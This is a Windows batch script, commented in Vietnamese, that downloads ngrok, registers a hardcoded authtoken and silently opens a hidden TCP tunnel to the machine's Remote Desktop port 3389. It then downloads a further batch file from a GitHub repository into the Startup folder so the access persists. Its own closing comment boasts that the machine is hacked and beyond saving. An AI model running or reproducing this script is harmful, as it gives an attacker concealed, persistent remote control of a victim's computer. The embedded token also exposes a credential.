@echo off

:: Bước 1: Tạo thư mục DkTX nếu chưa có
mkdir C:\DkTX

:: Bước 2: Tải ngrok.zip từ trang chính thức
echo Dang tai ngrok.zip...
curl -o "C:\DkTX\ngrok.zip" https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-windows-amd64.zip

:: Bước 3: Giải nén ngrok.zip
echo Dang giai nen ngrok.zip...
powershell -Command "Expand-Archive -Path 'C:\DkTX\ngrok.zip' -DestinationPath 'C:\DkTX' -Force"

:: Bước 4: Kiểm tra ngrok.exe da duoc giai nen
IF EXIST "C:\DkTX\ngrok.exe" (
    echo Giai nen thanh cong.
    del /f "C:\DkTX\ngrok.zip"
) ELSE (
    echo Loi: khong tim thay ngrok.exe sau khi giai nen.
    pause
    exit /b
)

:: Bước 5: Di chuyển vào thư mục
cd C:\DkTX

:: Bước 6: Chạy ngrok lần đầu để khởi tạo
echo Dang chay ngrok lan dau...
ngrok.exe >nul 2>&1

:: Bước 7: Thêm authtoken
ngrok.exe config add-authtoken 2hlr5hFpZid0dajdFUQvzl6AvL1_4oeHWSyQ78RPdZHRMAY5d

:: Bước 8: Chạy ngrok TCP 3389 và ẩn cửa sổ
echo Dang khoi dong ngrok (an cua so)...
powershell -WindowStyle Hidden -Command "Start-Process -FilePath 'C:\DkTX\ngrok.exe' -ArgumentList 'tcp 3389' -WindowStyle Hidden"

:: Bước 9: Tải TDMCngrok.bat vào thư mục Startup (shell:startup)
echo Dang tai TDMCngrok.bat vao Startup...

powershell -Command ^
  "$startup = [Environment]::GetFolderPath('Startup'); ^
   Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Datd6100/Sieu-kiem-soat-pc/refs/heads/main/TDMCngrok.bat' -OutFile ($startup + '\TDMCngrok.bat')"

:: Kiểm tra xem file đã tồn tại chưa
IF EXIST "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\TDMCngrok.bat" (
    echo Da them TDMCngrok.bat vao Startup.
) ELSE (
    echo Loi: khong the them TDMCngrok.bat vao Startup.
)

:: xong Hack Máy , Máy hết cứu 
echo cai dat ngrok & chinh sua da xong may het cuu :))
echo Tu dong thoat trong 10 giay...
timeout /t 10 >nul
exit
